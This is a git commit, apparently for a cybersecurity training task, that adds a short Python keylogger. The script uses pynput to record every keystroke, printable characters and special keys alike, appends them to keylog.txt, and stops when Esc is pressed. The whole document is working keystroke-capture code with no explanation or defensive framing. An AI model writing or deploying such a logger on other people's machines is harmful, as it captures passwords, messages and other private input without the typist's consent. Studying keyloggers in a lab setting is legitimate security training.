e954a5e1c2050437ab9414f2e7e7b7a0f9611a52
krushal94 <142566394+krushal94@users.noreply.github.com>
2024-04-05 20:24:28 +0530

    Create PRODIGY_CS_TASK4.py

---
+++ PRODIGY_CS_TASK4.py
@@ -0,0 +1,18 @@
+from pynput.keyboard import Key, Listener
+
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:  # Handle special keys like 'space', 'shift', etc.
+        with open(log_file, "a") as f:
+            f.write(f" {key} ")
+
+def on_release(key):
+    if key == Key.esc:  # Exit on pressing 'esc' key
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
